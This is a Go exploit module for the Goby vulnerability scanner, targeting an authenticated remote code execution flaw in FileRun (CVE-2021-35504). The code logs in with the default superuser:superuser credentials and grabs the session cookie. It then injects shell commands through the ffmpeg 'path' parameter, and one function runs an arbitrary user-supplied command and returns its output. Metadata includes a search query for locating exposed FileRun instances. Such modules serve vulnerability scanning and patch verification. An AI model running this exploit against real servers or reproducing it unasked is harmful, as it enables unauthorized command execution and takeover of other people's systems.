package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FileRun 2021.03.26 Auth RCE (CVE-2021-35504)",
    "Description": "<p>FlieRun is a simple, powerful and beautiful management system for file sharing.</p><p>The version of FileRun management system prior to 2021.03.26 has a remote code execution vulnerability in the back-end ffmpeg inspection path. Attackers can use this vulnerability to gain control of the server.</p>",
    "Impact": "FileRun 2021.03.26 Auth RCE (CVE-2021-35504)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://blog.filerun.com/security-update-released-2021-06-27\">http://blog.filerun.com/security-update-released-2021-06-27</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "FileRun",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "FileRun 管理系统2021.03.26版本后台命令执行漏洞 （CVE-2021-35504）",
            "Description": "<p>FlieRun是一款简单、强大、美观用于文件共享的管理系统。</p><p>FileRun管理系统2021.03.26之前的版本后台ffmpeg检查路径处存在远程代码执行漏洞（默认密码superuser：superuser），攻击者可利用该漏洞获取服务器控制权限。</p>",
            "Impact": "<p>FileRun管理系统2021.03.26之前的版本后台ffmpeg检查路径处存在远程代码执行漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"http://blog.filerun.com/security-update-released-2021-06-27\">http://blog.filerun.com/security-update-released-2021-06-27</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "FileRun",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "FileRun 2021.03.26 Auth RCE (CVE-2021-35504)",
            "Description": "<p>FlieRun is a simple, powerful and beautiful management system for file sharing.</p><p>The version of FileRun management system prior to 2021.03.26 has a remote code execution vulnerability in the back-end ffmpeg inspection path. Attackers can use this vulnerability to gain control of the server.</p>",
            "Impact": "FileRun 2021.03.26 Auth RCE (CVE-2021-35504)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://blog.filerun.com/security-update-released-2021-06-27\">http://blog.filerun.com/security-update-released-2021-06-27</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "FileRun",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"market://details?id=com.afian.FileRun\"",
    "GobyQuery": "body=\"market://details?id=com.afian.FileRun\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://filerun.com",
    "DisclosureDate": "2021-09-22",
    "References": [
        "https://syntegris-sec.github.io/filerun-advisory"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [
        "CVE-2021-35504",
        "CVE-2021-35505"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "FileRun"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10231"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := 2000 + rand.Intn(100)
			Rand2 := 1000 + rand.Intn(100)
			uri1 := "/?module=fileman&page=login&action=login"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Header.Store("Cookie", "language=chinese; FileRunSID=fokipisqbs99di23dg5epp6i91")
			cfg1.Data = `username=superuser&password=superuser&otp=&redirectAfterLogin=&two_step_secret=&language=`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					FileRunSID := regexp.MustCompile("Set-Cookie: FileRunSID=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					uri2 := "/?module=cpanel&section=settings&page=image_preview&action=checkFFmpeg"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
					cfg2.Header.Store("Cookie", "FileRunSID="+FileRunSID[1])
					cfg2.Data = fmt.Sprintf(`path=ffmpeg%%7Cecho%%20%%60expr%%20%d%%20-%%20%d%%60`, Rand1, Rand2)
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, strconv.Itoa(Rand1-Rand2))
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/?module=fileman&page=login&action=login"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Header.Store("Cookie", "language=chinese; FileRunSID=fokipisqbs99di23dg5epp6i91")
			cfg1.Data = `username=superuser&password=superuser&otp=&redirectAfterLogin=&two_step_secret=&language=`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					FileRunSID := regexp.MustCompile("Set-Cookie: FileRunSID=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					uri2 := "/?module=cpanel&section=settings&page=image_preview&action=checkFFmpeg"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
					cfg2.Header.Store("Cookie", "FileRunSID="+FileRunSID[1])
					cfg2.Data = fmt.Sprintf(`path=ffmpeg%%7Cecho%%20%%60%s%%60`, url.QueryEscape(cmd))
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							expResult.Output = resp2.RawBody
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
